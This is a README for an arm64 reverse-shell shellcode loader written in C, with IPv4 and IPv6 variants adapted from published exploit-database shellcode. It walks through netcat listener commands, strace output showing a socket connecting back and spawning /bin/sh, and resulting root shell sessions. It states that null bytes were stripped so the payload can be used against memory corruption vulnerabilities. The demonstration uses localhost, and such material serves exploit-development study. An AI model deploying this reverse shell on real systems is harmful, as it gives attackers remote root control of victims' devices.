# arm64_reverse_shellcode

C program to map arm64 reverse shell code into memory and execute code

## This will only work on target arm64 device. 
### Fixed stack management issues in original assembler code.

Source code for mapping revese shell code into memory and executing the mapped shell code.
The arm64 code was tested on a Raspberry Pi running Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1062-raspi2 aarch64).

## License

Please see the [LICENSE](LICENSE) file for the exact details.

## reverse-shellcode-mapped-ipv4
## reverse-sheelcode-mapped-ipv6

## About

The C program reverse-shellcode-mapped loads an array of arm-64 reverse shell code and execute in memory mapped location.  After relocating the shell code this code is invoked as a C function. A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell.

Two varients will be built and tested here one using IPv4 connections and the other that uses IPv6 connections.

This will demonstrate how to create a reverse shell and map it into memory.  This program will accept attempt a connection to a remote server and execute a shell to the remote connection.

Now the shell code assembler source code is modified to directly perform the system calls with the linux system call number.  Additionally, the null bytes have been removed from the code.  This will allow the shell code to be used to exploit memory corruption vulnerabilities.

This program can be ran as a shell or root user.

Next build and download the reverse shell code variants to mmap and run the shell code.  Next open two terminals on the target.  Then execute the server using netcat to listen for a client connection.  The client is started using strace to demonstrate the system calls used in the reverse shell process.  The strace process is invoked showing the system calls used by the client.  Following this the client side will be shown. Now this will be demonstrated using an IPv4 implementation of the reverse shell.  In the first terminal start the server using IPv4.
       
    $ nc -lvp 4444 127.0.0.1
    Listening on [127.0.0.1] (family 0, port 4444)

Next, a C program will demonstrate how the reverse shell code client can be executed.  In another terminal use netstat to identify the active ports on the target.  Then execute the reverse shell client using strace to show system calls executed.
       
    Start the client as root on the target
    $ su
    passphrase
    # netstat -tlpn
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address  Foreign Address  State      PID/Program name    
    tcp        0      0 127.0.0.53:53  0.0.0.0:*        LISTEN     2132/systemd-resolv 
    tcp        0      0 0.0.0.0:22     0.0.0.0:*        LISTEN     1289/sshd           
    tcp        0      0 127.0.0.1:4444 0.0.0.0:*        LISTEN     19314/nc            
    tcp6       0      0 :::22               :::*        LISTEN     1289/sshd

    # strace -e execve,socket,connect,dup3 ./reverse-shellcode-ipv4
    execve("./reverse-shellcode-mapped-ipv4", ["./reverse-shellcode-mapped-ipv4"], 0xffffd7e8dd70 /* 20 vars */) = 0
    Shellcode Length: 128 Bytes
    socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
    dup3(3, 2, 0)                           = 2
    dup3(3, 1, 0)                           = 1
    dup3(3, 0, 0)                           = 0
    execve("/bin/sh", NULL, NULL)           = 0
    --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19665, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
    --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19668, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
    +++ exited with 0 +++

Returning to the terminal where netcat was started after receiving a connection from the client execute any shell commands.  The requests for whoami, id and exit are shown below.
       
    $ nc -lvp 4444 127.0.0.1
    Listening on [127.0.0.1] (family 0, port 4444)
    Connection from localhost 46594 received!
    whoami
    root
    id
    uid=0(root) gid=0(root) groups=0(root)
    exit

Next build and download the memory mapped reverse shell code using IPv6 connections.  Open two terminals on the target.  Then execute the server using netcat to listen for a client connection.  The client is started using strace to demonstrate the system calls used in the reverse shell process.  The strace process is invoked showing the system calls used by the client.  Following this the client side will be shown. Now this will be demonstrated using an IPv6 implementation of the reverse shell.  In the first terminal start the server using IPv6.
       
    $ nc -lv -6 localhost 4444
    Listening on [localhost] (family 10, port 4444)

Next, a C program will demonstrate how the reverse shell IPv6 code client can be executed.  In another terminal use netstat to identify the active ports on the target.  Then execute the reverse shell client using strace to show system calls executed.

    On the Target run the reverse-shellcode program
    Start the client as root on the target
    $ su
    passphrase
    # netstat -tlpn
    (Not all processes could be identified, non-owned process info
    will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address    Foreign Address        State       PID/Program name    
    tcp        0      0 127.0.0.53:53    0.0.0.0:*              LISTEN      -                   
    tcp        0      0 0.0.0.0:22       0.0.0.0:*              LISTEN      -                   
    tcp6       0      0 :::22                 :::*              LISTEN      -                   
    tcp6       0      0 ::1:4444              :::*              LISTEN      22130/nc

    # strace -e execve,socket,connect,dup3 ./reverse-shellcode-mapped-ipv6
    execve("./reverse-shellcode-mapped-ipv6", ["./reverse-shellcode-mapped-ipv6"], 0xffffca985b20 /* 20 vars */) = 0
    Shellcode Length: 136 Bytes
    socket(AF_INET6, SOCK_STREAM, IPPROTO_IP) = 3
    connect(3, {sa_family=AF_INET6, sin6_port=htons(4444), inet_pton(AF_INET6, "::1", &sin6_addr), sin6_flowinfo=htonl(0), sin6_scope_id=0}, 28) = 0
    dup3(3, 2, 0)                           = 2
    dup3(3, 1, 0)                           = 1
    dup3(3, 0, 0)                           = 0
    execve("/bin/sh", NULL, NULL)           = 0 
    --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20477, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
    --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20478, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
    +++ exited with 0 +++

Returning to the terminal where netcat was started after receiving a connection from the client, execute any shell commands.  The requests for whoami, id and exit are shown below.
       
    $ nc -lv -6 localhost 4444
    Listening on [localhost] (family 10, port 4444)
    Connection from ip6-localhost 60360 received!
    whoami
    root
    id
    uid=0(root) gid=0(root) groups=0(root)
    exit
       
## Stack Management Issues

For AArch64, sp must be 16-byte aligned whenever it is used to access memory. This is enforced by AArch64 hardware.

// Broken AArch64 implementation of `push {x1}; push {x0};`.
str   x1, [sp, #-8]!  // This works, but leaves `sp` with only 8-byte alignment
str   x0, [sp, #-8]!  // ... so the second `str` will fail.

C compilers will typically reserve stack space at the start of the function, then leave sp alone until the end, so the restriction is not as awkward as it first seems. However, you must be aware of it when handling assembly code.

It sounds wasteful – and in most cases it is – but the simplest way to handle the stack pointer can be to push each value to a 16-byte slot. This doubles the stack usage (for pointer-sized values), and it effectively reduces the available memory bandwidth. It is also awkward to implement multiple-register operations using this scheme, since each register requires a separate instruction.

## Sources: sc_mapped

Credit to Ken Kitahara for the use of his source code.

https://packetstormsecurity.com/files/153464/Linux-ARM64-Reverse-TCP-Shell-Null-Free-Shellcode.html

https://www.exploit-db.com/exploits/47052

Max Compston, Embedded Software Solutions.

## Building this Release

The source code for this program is built using CMake.  

The source code for the arm64 target are cross compiled using gnu arm64 compiler, below.  First in install the cross-compiler on the host.

$ sudo apt-get install gcc-aarch64-linux-gnu g++-aarch64-linux-gnu

Next, set up the host to cross-compile arm64 creating a toolchain-aarch64-linux-gnu.cmake file in your home directory.  Add the following:

#- this one is important
SET(CMAKE_SYSTEM_NAME Linux)
SET(CMAKE_SYSTEM_PROCESSOR arm64)

#- specify the cross compiler
SET(CMAKE_C_COMPILER   /usr/bin/aarch64-linux-gnu-gcc)
SET(CMAKE_CXX_COMPILER /usr/bin/aarch64-linux-gnu-g++)

#- where is the target environment
SET(CMAKE_FIND_ROOT_PATH  /user/aarch64-linux-gnu)

#- search for programs in the build host directories
SET(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)

#- for libraries and headers in the target directories
SET(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
SET(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)

To build the cross-compiled arm64 program navigate to the build directory and run cmake as follows:

$ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
